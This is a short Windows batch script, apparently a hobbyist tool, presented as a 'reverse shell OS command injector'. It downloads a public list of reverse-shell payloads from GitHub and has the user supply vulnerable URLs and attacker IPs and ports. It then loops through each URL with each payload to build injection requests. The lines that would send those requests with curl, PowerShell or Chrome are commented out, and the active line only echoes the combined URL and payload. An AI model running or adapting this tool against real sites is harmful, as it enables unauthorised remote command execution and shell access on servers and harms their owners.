@echo off

:oscmd
setlocal
echo       ===============================================================================================
echo      //                  *******  Reverses shell OS command Injector ******                          \\
if not exist %cd%\vunarable_url.txt type nul > vunarable_url.txt
if not exist %cd%\oscmd.txt curl -L "https://raw.githubusercontent.com/mthbernardes/rsg/master/shells.txt" >> oscmd.txt
echo ======================================================================================================================
echo      \\Put vunarable urls ^(Exp . https://example.com/search?q=^[vunarable^]^) inside vunarable_url.txt  //

echo       \\ Put vunarable commands/ip/port inside oscmd.txt                                            //





echo ======================================================================================================================
echo                                                         Made by Himel Sarkar ^(https://www.youtube.com/channel/UCZwYYKY3PhVLhh-xNuxWneA/discussion^) 
write vunarable_url.txt
write oscmd.txt

echo Press enter to continue next step . . .
pause >> nul 

sort /C /UNIQUE "oscmd.txt" /O "oscmd.txt"
sort /C /UNIQUE "vunarable_url.txt" /O "vunarable_url.txt"
cls
echo Block new ips while reading them from oscmd.txt
for /f %%u in (vunarable_url.txt) do (
for /f %%i in (oscmd.txt) do (

rem curl -v https://javarevisited.blogspot.com/search?q=%%i
rem curl -v https://javarevisited.blogspot.com/search?q=%%i
rem curl -V “https://javarevisited.blogspot.com/search?q=%%i"
 rem powershell "Invoke-WebRequest http://avarevisited.blogspot.com/search?q=%%i"
rem start chrome.exe javascript:document. %%u%%i

 echo %%u%%i
rem curl -v “%%u%%i"

)
)
pause                   